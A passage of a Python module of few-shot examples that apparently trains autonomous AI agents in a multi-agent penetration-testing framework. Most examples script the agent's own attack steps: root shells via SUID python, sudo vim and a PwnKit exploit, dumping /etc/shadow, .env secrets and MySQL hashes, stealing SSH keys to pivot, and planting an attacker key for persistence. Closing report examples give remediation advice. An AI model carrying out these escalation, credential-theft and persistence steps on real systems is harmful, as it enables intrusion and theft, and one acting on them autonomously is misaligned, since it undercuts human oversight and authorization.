  "confidence": 0.99,
  "techniques_tried": [
    {"technique": "sudo -l check", "command": "sudo -l", "success": false, "reason": "sudo not available for www-data"},
    {"technique": "SUID python3.6", "command": "python3.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "success": true, "reason": "SUID bit set on /usr/bin/python3.6, setuid(0) succeeded"}
  ],
  "successful_technique": {
    "technique": "SUID python3 setuid(0)",
    "command": "python3.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "cve": null,
    "gtfobins_entry": "python3#suid",
    "mitre_id": "T1548.001",
    "evidence": "# id → uid=0(root) gid=33(www-data) groups=33(www-data)"
  },
  "root_achieved": true,
  "mitre_techniques": ["T1548.001"],
  "next_agent": "postexploit_agent",
  "sources": ["GTFOBins:python3#suid"]
}"""
    ),
    FewShotExample(
        scenario="sudo vim NOPASSWD → root via GTFOBins shell escape",
        input_data='{"target": "10.10.10.55", "current_user": "john", "sudo_l_output": "(root) NOPASSWD: /usr/bin/vim"}',
        thought="sudo vim NOPASSWD for john as root. GTFOBins: sudo vim -c ':!/bin/bash'. Direct root with confidence 1.0.",
        action="sudo vim -c ':!/bin/bash'",
        observation="""[vim opens, then after :!/bin/bash executed]
root@web02:~# id
uid=0(root) gid=0(root) groups=0(root)
root@web02:~# whoami
root""",
        output="""{
  "agent": "privesc_agent",
  "phase": "privesc",
  "target": "10.10.10.55",
  "initial_user": "john",
  "final_user": "root",
  "confidence": 1.0,
  "techniques_tried": [
    {"technique": "sudo vim GTFOBins shell escape", "command": "sudo vim -c ':!/bin/bash'", "success": true, "reason": "NOPASSWD vim allows shell escape via :!/bin/bash in vim command mode"}
  ],
  "successful_technique": {
    "technique": "sudo vim shell escape",
    "command": "sudo vim -c ':!/bin/bash'",
    "cve": null,
    "gtfobins_entry": "vim#sudo",
    "mitre_id": "T1548.003",
    "evidence": "uid=0(root) gid=0(root) groups=0(root)"
  },
  "root_achieved": true,
  "mitre_techniques": ["T1548.003"],
  "next_agent": "postexploit_agent",
  "sources": ["GTFOBins:vim#sudo"]
}"""
    ),
    FewShotExample(
        scenario="PwnKit CVE-2021-4034 exploit on all Linux distros",
        input_data='{"target": "10.10.10.70", "current_user": "apache", "sudo_l": "no sudo", "suid_check": "no useful SUIDs", "kernel": "5.10.0-19"}',
        thought="No sudo, no useful SUIDs. Falling back to kernel/polkit exploits. Check polkit version for CVE-2021-4034 (PwnKit). Affects ALL Linux distros with polkit installed regardless of kernel version.",
        action="dpkg -l policykit-1 2>/dev/null || rpm -qa polkit 2>/dev/null",
        observation="""dpkg -l policykit-1
ii  policykit-1  0.105-26  amd64  framework for managing administrative policies

[CVE-2021-4034 PwnKit PoC from GitHub]
$ gcc -o pwnkit pwnkit.c && ./pwnkit
# id
uid=0(root) gid=0(root) groups=0(root)""",
        output="""{
  "agent": "privesc_agent",
  "phase": "privesc",
  "target": "10.10.10.70",
  "initial_user": "apache",
  "final_user": "root",
  "confidence": 0.97,
  "techniques_tried": [
    {"technique": "sudo -l", "command": "sudo -l", "success": false, "reason": "No sudo rules for apache"},
    {"technique": "SUID binary search", "command": "find / -perm -4000 2>/dev/null", "success": false, "reason": "No GTFOBins-exploitable SUIDs found"},
    {"technique": "CVE-2021-4034 PwnKit", "command": "gcc -o pwnkit pwnkit.c && ./pwnkit", "success": true, "reason": "polkit 0.105-26 vulnerable to CVE-2021-4034, affects all distros"}
  ],
  "successful_technique": {
    "technique": "CVE-2021-4034 PwnKit polkit pkexec local privilege escalation",
    "command": "gcc -o pwnkit ~/CyberAgent/tools/pwnkit.c && ./pwnkit",
    "cve": "CVE-2021-4034",
    "gtfobins_entry": null,
    "mitre_id": "T1068",
    "evidence": "uid=0(root) gid=0(root) groups=0(root)"
  },
  "root_achieved": true,
  "mitre_techniques": ["T1068"],
  "next_agent": "postexploit_agent",
  "sources": ["NVD:CVE-2021-4034", "HackTricks:Linux PrivEsc PwnKit"]
}"""
    ),
]


# ─── POST-EXPLOITATION EXAMPLES ───────────────────────────────────────────────

POSTEXPLOIT_EXAMPLES: List[FewShotExample] = [
    FewShotExample(
        scenario="Root achieved — harvest all credentials and map pivots",
        input_data='{"target": "10.10.10.50", "current_user": "root", "hostname": "web01"}',
        thought="Root on web01. Standard post-exploitation checklist: dump shadow, find configs with passwords, check bash history, find SSH keys, map internal network.",
        action="cat /etc/shadow; find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null | head -5; ip route",
        observation="""[/etc/shadow]
root:$6$rounds=656000$xyz$HASH:19000:0:99999:7:::
www-data:*:18375:0:99999:7:::
john:$6$rounds=656000$abc$HASH2:19000:0:99999:7:::

[/var/www/html/.env]
DB_HOST=localhost
DB_USER=webapp
DB_PASSWORD=S3cur3P@ssw0rd!
APP_KEY=base64:abc123...

[ip route]
default via 192.168.1.1 dev eth0
10.10.10.0/24 dev eth0 proto kernel
172.16.0.0/16 dev eth1 proto kernel  ← INTERNAL NETWORK FOUND""",
        output="""{
  "agent": "postexploit_agent",
  "phase": "postexploit",
  "target": "10.10.10.50",
  "confidence": 1.0,
  "loot": [
    {"type": "hash", "content": "root:$6$rounds=656000$xyz$HASH", "file_path": "/etc/shadow", "service": "system"},
    {"type": "hash", "content": "john:$6$rounds=656000$abc$HASH2", "file_path": "/etc/shadow", "service": "system"},
    {"type": "credential", "content": "webapp:S3cur3P@ssw0rd!", "file_path": "/var/www/html/.env", "service": "MySQL"}
  ],
  "credentials_harvested": [
    {"username": "root", "password_or_hash": "$6$rounds=656000$xyz$HASH", "service": "shadow", "cracked": false, "hash_type": "sha512crypt"},
    {"username": "john", "password_or_hash": "$6$rounds=656000$abc$HASH2", "service": "shadow", "cracked": false, "hash_type": "sha512crypt"},
    {"username": "webapp", "password_or_hash": "S3cur3P@ssw0rd!", "service": "MySQL", "cracked": true}
  ],
  "pivot_targets": [
    {"ip": "172.16.0.0/16", "open_ports": [], "hostname": "internal network", "note": "eth1 connected to 172.16.0.0/16 — enumerate with nmap via pivot", "reachable": true}
  ],
  "persistence_paths": ["SSH key injection: echo 'ATTACKER_PUBKEY' >> /root/.ssh/authorized_keys"],
  "mitre_techniques": ["T1003.008", "T1552.001", "T1021.004"],
  "next_agent": "report_agent",
  "sources": [{"tool": "cat", "command": "cat /etc/shadow", "output_line": "john:$6$rounds=656000$abc$HASH2"}]
}"""
    ),
    FewShotExample(
        scenario="Database credential dump from MySQL root",
        input_data='{"target": "10.10.10.50", "current_user": "root", "mysql_accessible": true}',
        thought="MySQL accessible as root. Dump all user credentials from mysql.user table. Also list all databases for sensitive data.",
        action="mysql -u root -e \"SELECT user,authentication_string FROM mysql.user; SHOW DATABASES;\"",
        observation="""+------------------+-------------------------------------------+
| user             | authentication_string                     |
+------------------+-------------------------------------------+
| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1 |
| webapp           | *3C7F5B6A9D1E8F2C4B0A5D9E3C1F7B2A4D8E6  |
| backup_user      | *AA1420F182E88B9E5F874F6FBE7459291E8F4B7 |
+------------------+-------------------------------------------+

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| webapp_db          |
| customer_data      |
+--------------------+""",
        output="""{
  "agent": "postexploit_agent",
  "phase": "postexploit",
  "target": "10.10.10.50",
  "confidence": 1.0,
  "loot": [
    {"type": "database_dump", "content": "MySQL users: root, webapp, backup_user with hashes", "file_path": "mysql.user table", "service": "MySQL"},
    {"type": "database_dump", "content": "Databases: webapp_db, customer_data (high sensitivity)", "file_path": "information_schema", "service": "MySQL"}
  ],
  "credentials_harvested": [
    {"username": "root", "password_or_hash": "*81F5E21E35407D884A6CD4A731AEBFB6AF209E1", "service": "MySQL", "cracked": false, "hash_type": "MySQL41"},
    {"username": "webapp", "password_or_hash": "*3C7F5B6A9D1E8F2C4B0A5D9E3C1F7B2A4D8E6", "service": "MySQL", "cracked": false, "hash_type": "MySQL41"},
    {"username": "backup_user", "password_or_hash": "*AA1420F182E88B9E5F874F6FBE7459291E8F4B7", "service": "MySQL", "cracked": false, "hash_type": "MySQL41"}
  ],
  "pivot_targets": [],
  "persistence_paths": [],
  "mitre_techniques": ["T1005", "T1213"],
  "next_agent": "report_agent",
  "sources": [{"tool": "mysql", "command": "mysql -u root -e 'SELECT user,authentication_string FROM mysql.user'", "output_line": "customer_data database found"}]
}"""
    ),
    FewShotExample(
        scenario="SSH key theft and lateral movement discovery",
        input_data='{"target": "10.10.10.50", "current_user": "root", "known_users": ["john", "sarah"]}',
        thought="Root access. Check for SSH private keys in all user home directories and root. Keys can enable passwordless lateral movement to other hosts.",
        action="find /root /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null && cat /root/.ssh/known_hosts 2>/dev/null",
        observation="""[find output]
/root/.ssh/id_rsa
/home/john/.ssh/id_ed25519

[/root/.ssh/known_hosts]
10.10.10.200 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...
192.168.10.50 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...
db01.internal ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...

[/root/.ssh/id_rsa]
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAA...
-----END OPENSSH PRIVATE KEY-----""",
        output="""{
  "agent": "postexploit_agent",
  "phase": "postexploit",
  "target": "10.10.10.50",
  "confidence": 1.0,
  "loot": [
    {"type": "ssh_key", "content": "[REDACTED — stored in MissionMemory]", "file_path": "/root/.ssh/id_rsa", "service": "SSH"},
    {"type": "ssh_key", "content": "[REDACTED — stored in MissionMemory]", "file_path": "/home/john/.ssh/id_ed25519", "service": "SSH"}
  ],
  "credentials_harvested": [],
  "pivot_targets": [
    {"ip": "10.10.10.200", "open_ports": [22], "hostname": "unknown", "note": "Root's SSH known_hosts entry — try: ssh -i /root/.ssh/id_rsa root@10.10.10.200", "reachable": true},
    {"ip": "192.168.10.50", "open_ports": [22], "hostname": "unknown", "note": "SSH known_hosts — separate network segment", "reachable": true},
    {"ip": "db01.internal", "open_ports": [22], "hostname": "db01.internal", "note": "Internal hostname — likely database server", "reachable": true}
  ],
  "persistence_paths": ["SSH key theft enables lateral movement without password"],
  "mitre_techniques": ["T1552.004", "T1021.004", "T1078"],
  "next_agent": "report_agent",
  "sources": [{"tool": "find", "command": "find /root /home -name 'id_rsa' 2>/dev/null", "output_line": "/root/.ssh/id_rsa"}]
}"""
    ),
]


# ─── REPORTING EXAMPLES ───────────────────────────────────────────────────────

REPORT_EXAMPLES: List[FewShotExample] = [
    FewShotExample(
        scenario="Full pentest completed — generate executive summary + critical finding",
        input_data='{"findings": [{"cve": "CVE-2021-41773", "cvss": 9.8, "host": "10.10.10.50"}, {"cve": "CVE-2021-4034", "cvss": 7.8}], "root_achieved": true}',
        thought="Two findings: Critical CVE-2021-41773 and High CVE-2021-4034. Root achieved via chained exploitation. Generate executive summary in business language + structured finding blocks.",
        action="Compile MissionMemory findings into PTES-standard report",
        observation="Full mission data available: recon through root, credentials dumped, pivot discovered.",
        output="""{
  "agent": "report_agent",
  "phase": "report",
  "target": "10.10.10.50",
  "report": {
    "executive_summary": {
      "critical_count": 1,
      "high_count": 1,
      "medium_count": 0,
      "low_count": 0,
      "info_count": 0,
      "top_risk": "An attacker with no prior access can remotely execute commands on your web server and escalate to full administrative control in under 5 minutes",
      "business_impact": "Complete server compromise possible. Customer data accessible. Internal network reachable from compromised server. Regulatory exposure under GDPR Article 32.",
      "remediation_priorities": [
        "URGENT: Upgrade Apache HTTP Server from 2.4.49 to 2.4.51+ (patches CVE-2021-41773)",
        "HIGH: Update polkit package to latest version (patches CVE-2021-4034 PwnKit)",
        "HIGH: Disable mod_cgi if not required; implement WAF with path traversal ruleset"
      ]
    },
    "attack_chain": [
      {"step": 1, "action": "Port scan revealed Apache 2.4.49 on port 80", "mitre_id": "T1046", "tool_used": "nmap", "evidence_ref": "nmap output: 80/tcp open http Apache httpd 2.4.49"},
      {"step": 2, "action": "CVE-2021-41773 path traversal read /etc/passwd", "mitre_id": "T1190", "tool_used": "curl", "evidence_ref": "curl response: root:x:0:0:root:/root:/bin/bash"},
      {"step": 3, "action": "CVE-2021-41773 RCE via mod_cgi → reverse shell as www-data", "mitre_id": "T1190", "tool_used": "curl+nc", "evidence_ref": "id: uid=33(www-data)"},
      {"step": 4, "action": "CVE-2021-4034 PwnKit → privilege escalation to root", "mitre_id": "T1068", "tool_used": "pwnkit PoC", "evidence_ref": "id: uid=0(root)"}
    ],
    "findings": [
      {
        "id": "FINDING-001",
        "title": "Apache HTTP Server 2.4.49 — Remote Code Execution (CVE-2021-41773)",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cve": "CVE-2021-41773",
        "cwe": "CWE-22",
        "mitre_id": "T1190",
        "host": "10.10.10.50",
        "port": 80,
        "service": "Apache HTTP Server 2.4.49",
        "description": "Apache HTTP Server 2.4.49 contains a path traversal vulnerability that allows unauthenticated remote attackers to read arbitrary files. When mod_cgi is enabled, this escalates to remote code execution.",
        "evidence": "curl --path-as-is 'http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/etc/passwd' returned: root:x:0:0:root:/root:/bin/bash",
        "business_impact": "Unauthenticated attacker can read all server files including credentials, and execute arbitrary commands, leading to full system compromise.",
        "remediation": "Immediately upgrade Apache HTTP Server to version 2.4.51 or later. Disable mod_cgi if CGI is not required. Implement WAF rules blocking path traversal patterns (../ and %2e%2e).",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773", "https://httpd.apache.org/security/vulnerabilities_24.html", "https://cwe.mitre.org/data/definitions/22.html"]
      }
    ],
    "mitre_attack_coverage": {
      "tactics": ["TA0043 Reconnaissance", "TA0001 Initial Access", "TA0002 Execution", "TA0004 Privilege Escalation"],
      "techniques": ["T1046 Network Service Discovery", "T1190 Exploit Public-Facing Application", "T1059.004 Unix Shell", "T1068 Exploitation for Privilege Escalation"]
    }
  },
  "sources": ["PTES", "OWASP-WSTG", "MITRE-ATT&CK", "NVD"]
}"""
    ),
    FewShotExample(
        scenario="Medium-severity finding — SQL injection without RCE",
        input_data='{"finding": "SQL injection on /search?q= parameter, MySQL backend, read-only user, no file_priv"}',
        thought="SQLi confirmed but MySQL user is read-only, no FILE privilege. Cannot write web shell. Can dump database contents. Severity: High (data exposure) not Critical (no RCE).",
        action="Generate finding block with accurate CVSS scoring",
        observation="sqlmap confirmed time-based blind SQLi, dumped users table with MD5 hashes.",
        output="""{
  "id": "FINDING-002",
  "title": "SQL Injection — Data Exfiltration via Blind Time-Based Injection (/search endpoint)",
  "severity": "High",
  "cvss_score": 7.5,
  "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
  "cve": null,
  "cwe": "CWE-89",
  "mitre_id": "T1190",
  "host": "10.10.10.60",
  "port": 80,
  "service": "Custom PHP web application",
  "description": "The /search endpoint accepts unsanitized user input in the 'q' parameter which is directly interpolated into SQL queries. An attacker can extract all database contents using time-based blind injection. The MySQL user lacks FILE privilege preventing web shell upload.",
  "evidence": "sqlmap command: sqlmap -u 'http://10.10.10.60/search?q=test' --dbs --batch\nResult: Databases enumerated, users table dumped with MD5 password hashes",
  "business_impact": "All customer data including usernames, email addresses, and password hashes (MD5) can be exfiltrated. MD5 hashes are trivially crackable, leading to account takeover.",
  "remediation": "1. Use parameterized queries / prepared statements in all database interactions. 2. Migrate from MD5 to bcrypt/argon2 for password hashing. 3. Apply least-privilege: web app DB user should have SELECT only on required tables. 4. Implement WAF rule blocking SQLi patterns.",
  "references": ["https://owasp.org/www-community/attacks/SQL_Injection", "https://cwe.mitre.org/data/definitions/89.html", "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"]
}"""
    ),
    FewShotExample(
        scenario="Informational finding — security header missing",
        input_data='{"finding": "X-Content-Type-Options and X-Frame-Options headers missing on all responses"}',
        thought="Missing security headers are informational/low. No direct exploit path but enables clickjacking and MIME sniffing attacks. Document with appropriate low/info severity.",
        action="Generate informational finding",
        observation="curl -I http://target shows no security headers in response",
        output="""{
  "id": "FINDING-005",
  "title": "Missing HTTP Security Headers — X-Content-Type-Options, X-Frame-Options",
  "severity": "Low",
  "cvss_score": 3.1,
  "cvss_vector": "AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
  "cve": null,
  "cwe": "CWE-1021",
  "mitre_id": "T1204.001",
  "host": "10.10.10.50",
  "port": 80,
  "service": "Apache HTTP Server 2.4.49",
  "description": "The web server does not include X-Content-Type-Options or X-Frame-Options response headers. This allows browsers to perform MIME-type sniffing (potential XSS vector) and enables clickjacking attacks via iframe embedding.",
  "evidence": "curl -I http://10.10.10.50 — no X-Content-Type-Options or X-Frame-Options in response headers",
  "business_impact": "Low direct impact. Could be leveraged as part of social engineering or phishing attack chain targeting users of this application.",
  "remediation": "Add to Apache configuration: Header always set X-Content-Type-Options nosniff\nHeader always set X-Frame-Options SAMEORIGIN\nHeader always set X-XSS-Protection '1; mode=block'",
  "references": ["https://owasp.org/www-project-secure-headers/", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"]
}"""
    ),
]


# ─── EXAMPLE REGISTRY ─────────────────────────────────────────────────────────

AGENT_EXAMPLES: Dict[str, List[FewShotExample]] = {
    "orchestrator_agent": ORCHESTRATOR_EXAMPLES,
    "recon_agent": RECON_EXAMPLES,
    "enum_agent": ENUM_EXAMPLES,
    "vuln_agent": VULN_EXAMPLES,
    "exploit_agent": EXPLOIT_EXAMPLES,
    "privesc_agent": PRIVESC_EXAMPLES,
    "postexploit_agent": POSTEXPLOIT_EXAMPLES,
    "report_agent": REPORT_EXAMPLES,
}


def get_few_shot_block(agent_name: str) -> str:
    """
    Get all few-shot examples for an agent formatted for prompt injection.
    
    Args:
        agent_name: Agent identifier (must be in AGENT_EXAMPLES)
    
    Returns:
        Formatted string of all examples for this agent
    """
    if agent_name not in AGENT_EXAMPLES:
        raise ValueError(f"No examples for agent: {agent_name}. Available: {list(AGENT_EXAMPLES.keys())}")
    
    examples = AGENT_EXAMPLES[agent_name]
    lines = [f"## FEW-SHOT EXAMPLES ({len(examples)} scenarios)\n"]
    for i, ex in enumerate(examples, 1):
        lines.append(f"---EXAMPLE {i}: {ex.scenario}---")
        lines.append(ex.to_prompt_string())
    return "\n".join(lines)


def list_example_agents() -> list[str]:
    """Return all agents with few-shot examples."""
    return list(AGENT_EXAMPLES.keys())
